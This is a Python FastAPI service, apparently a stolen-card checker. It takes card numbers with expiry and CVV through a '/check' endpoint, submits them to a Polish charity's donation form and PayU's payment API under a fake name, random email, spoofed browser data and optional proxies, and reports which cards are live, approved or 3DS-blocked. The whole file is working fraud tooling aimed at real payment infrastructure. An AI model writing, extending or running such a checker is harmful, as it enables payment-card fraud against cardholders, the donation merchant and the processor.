from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import re
import json
import time
import random
import string
import requests

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def _random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def _random_ua():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"

def _poll_status(session, order_id, token, ua, max_attempts=5, delay=3):
    # DITUKAR: max_attempts=5 (5 x 3 saat = 15 saat menunggu bank)
    headers = {
        'accept': '*/*',
        'authorization': f'Bearer {token}',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'user-agent': ua,
    }
    for _ in range(max_attempts):
        time.sleep(delay)
        try:
            r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)
            data = r.json()
            if data.get('category') not in ('IN_PROGRESS', 'NEW'):
                return data
        except:
            pass
    return {"category": "TIMEOUT_POLL"} # Bank tak jawab dalam 15 saat

def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
    start_time = time.time()
    email = _random_email()
    name = "Jan Kowalski"
    
    # STEP 1: DYNAMIC MERCHANT REQUEST
    if 'horse_payu' in site_url or 'ajax' in site_url:
        ajax_url = site_url if site_url.endswith('/') else site_url + '/'
        headers1 = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url.split('/ajax')[0] if '/ajax' in site_url else site_url.rsplit('/', 1)[0],
            'referer': site_url,
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        data1 = {'amount': '20', 'firstname': name.split()[0], 'lastname': name.split()[1], 'email': email, 'extra': ''}
    else:
        ajax_url = site_url
        headers1 = {
            'accept': 'text/html',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url.rsplit('/', 1)[0],
            'referer': site_url,
            'user-agent': ua,
        }
        data1 = {'name': name, 'email': email, 'amount': '20', 'purpose': 'Donation'}

    r1 = session.post(ajax_url, headers=headers1, data=data1, allow_redirects=False, timeout=30)
    order_id, token = None, None

    loc = r1.headers.get('Location', '')
    body = r1.text
    search_pool = loc + " " + body
    
    oid = re.search(r'orderId=([^&]+)', search_pool)
    tok = re.search(r'token=([^&]+)', search_pool)
    if oid: order_id = oid.group(1)
    if tok: token = tok.group(1)

    if not order_id or not token:
        return None, None, None, "Failed to extract Order ID", time.time() - start_time

    # STEP 2: LOAD PAYU GATEWAY
    try:
        page_html = session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, headers={'user-agent': ua}, timeout=30).text
        amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', page_html)
        final_amount = int(amt_match.group(1)) if amt_match else 2000
    except:
        final_amount = 2000

    # STEP 3: TOKENIZE
    headers3 = {
        'accept': '*/*', 'authorization': f'Bearer {token}', 'content-type': 'application/json',
        'origin': 'https://secure.payu.com', 'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'user-agent': ua,
    }
    json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': cc, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
    
    r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
    try:
        token_data = r3.json()
    except:
        return None, None, None, "Failed to parse token JSON", time.time() - start_time

    card_token = token_data.get('value')

    if not card_token:
        err = token_data.get('error', {})
        err_msg = err.get('message', str(err)) if isinstance(err, dict) else str(err)
        return None, None, None, f"Tokenization Failed: {err_msg}", time.time() - start_time

    # STEP 4: CHARGE
    json4 = {
        'email': email, 'firstName': name.split()[0], 'lastName': name.split()[1],
        'currency': 'PLN', 'amount': final_amount,
        'payMethod': {'type': 'c', 'token': card_token, 'cardDetails': {'maskedCardNumber': f"{cc[:6]}******{cc[-4:]}"}},
        'browserData': {'screenWidth': 800, 'javaEnabled': False, 'timezoneOffset': -330, 'screenHeight': 1280, 'userAgent': ua, 'colorDepth': 24, 'language': 'en-US', 'challengeWindowSize': '04'},
        'language': 'en',
    }
    
    r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
    try:
        pay_data = r4.json()
    except:
        return None, None, None, "Failed to parse payment JSON", time.time() - start_time

    if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
        err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('errorCode', ''))
        return "ERROR", err_desc, "Inactive", f"Declined: {err_desc}", time.time() - start_time

    # STEP 5: POLL BANK STATUS (SEKARANG 15 SAAT)
    continue_url = pay_data.get('continueUrl', '')
    if 'threeds' in continue_url:
        final_status = _poll_status(session, order_id, token, ua)
    else:
        final_status = _poll_status(session, order_id, token, ua, max_attempts=2, delay=2)

    category = final_status.get('category', '')
    value = final_status.get('value', '')
    elapsed = round(time.time() - start_time, 2)

    # LOGIK BARU: Tangani TIMEOUT_POLL
    if category == 'TIMEOUT_POLL':
        return "TIMEOUT", "NO_RESPONSE", "Inactive", "Timeout: Bank No Response (Likely Live)", elapsed

    if category == 'SUCCESS':
        return "SUCCESS", "ORDER_PLACED", "Inactive", "Approved", elapsed
    elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
        return "3DS_TRIGGERED", value, "Active", "Declined (3DS Block)", elapsed
    elif category == 'ERROR':
        return "ERROR", value, "Inactive", f"Declined: {value}", elapsed
    else:
        return "UNKNOWN", value, "Inactive", f"Uncertain: {category}", elapsed

@app.get("/check")
def check_card(
    cc: str = Query(...), 
    site: str = Query("https://beta3.centaurus.org.pl/ajax/horse_payu/"), 
    proxy: str = Query(None)
):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
    
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
        
    session = requests.Session()
    
    if proxy:
        session.proxies = {
            'http': f"http://{proxy}" if not proxy.startswith('http') else proxy,
            'https': f"http://{proxy}" if not proxy.startswith('http') else proxy,
        }

    try:
        gateway, bank_res, tds_status, response_msg, elapsed_time = _process_payu(
            session, card_num, mm, yy, cvv_code, site, _random_ua()
        )
        
        # Saya buang Debug_Raw_Data kerana kita dah tahu masalahnya (Bank lambat)
        return {
            "Gateway": "PayU",
            "CC": cc,
            "Price": "20.0 PLN",
            "Response": response_msg,
            "Bank Response": bank_res,
            "3ds": tds_status,
            "Time": f"{elapsed_time}s"
        }
    except requests.exceptions.Timeout:
        return {
            "Gateway": "PayU",
            "CC": cc,
            "Price": "20.0 PLN",
            "Response": "Error: Timeout",
            "Bank Response": "None",
            "3ds": "Inactive",
            "Time": "30.0s"
        }
    except Exception as e:
        return {
            "Gateway": "PayU",
            "CC": cc,
            "Price": "20.0 PLN",
            "Response": f"Error: {str(e)}",
            "Bank Response": "None",
            "3ds": "Inactive",
            "Time": "0.0s"
        }
